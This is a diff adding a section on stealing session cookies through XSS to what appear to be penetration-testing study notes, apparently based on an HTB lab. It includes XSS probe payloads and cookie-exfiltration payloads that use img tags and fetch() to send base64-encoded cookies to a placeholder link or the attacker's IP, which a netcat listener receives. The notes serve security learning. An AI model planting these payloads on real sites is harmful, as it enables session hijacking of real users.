@@ -113,3 +113,76 @@ select * from all_sessions where id=3;
 <figure><img src="../../../.gitbook/assets/image (1370).png" alt=""><figcaption><p>We could now authenticate as the user "Developer."</p></figcaption></figure>
 
 ## Cross-Site Scripting (XSS)
+
+For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:
+
+* Session cookies should be carried in all HTTP requests
+* Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)
+
+First let's create an account to look at functionalities ->
+
+To craft our payload, it's good to use handlers like `onload` or `onerror` since they fire up automatically, if they're blocked, we can  use something like `onmouseover`.
+
+```javascript
+"><img src=x onerror=prompt(document.domain)>
+```
+
+`document.domain` to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment.
+
+and in the remaining fields, we can put the following:
+
+```javascript
+"><img src=x onerror=confirm(1)>
+```
+
+```javascript
+"><img src=x onerror=alert(1)>
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+When we save we gor nothing poping on our screen, that's because we need to call the code with another functionality ->&#x20;
+
+When we click on share:
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Now we need to check if _HTTPOnly_ is off
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+To steal a cookie in real world we can use [XSSHunter](https://xsshunter.com), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or webhook.site
+
+The payload would look somehing like:
+
+```javascript
+<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+{% content-ref url="../../../red-team/technical-knowledge/web-application/xss-injection.md" %}
+[xss-injection.md](../../../red-team/technical-knowledge/web-application/xss-injection.md)
+{% endcontent-ref %}
+
+Now let's say the victim clicks on our link, in our webhook or anything else, we should see our cookie pop and can use it to hijack session
+
+### cookies via XSS (Netcat edition)
+
+First we place the below payload in the _Country_ field of Ela Stienen's profile and click "Save."
+
+```javascript
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+
+Then we launch netcat on port 8000
+
+now we simulate what the victim would do and navigate to `http://xss.htb.net/profile?email=ela.stienen@example.com` since we control this public profile hosting a cookie-stealing payload
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects.
+
+```javascript
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
+
+## CSRF or XSRF
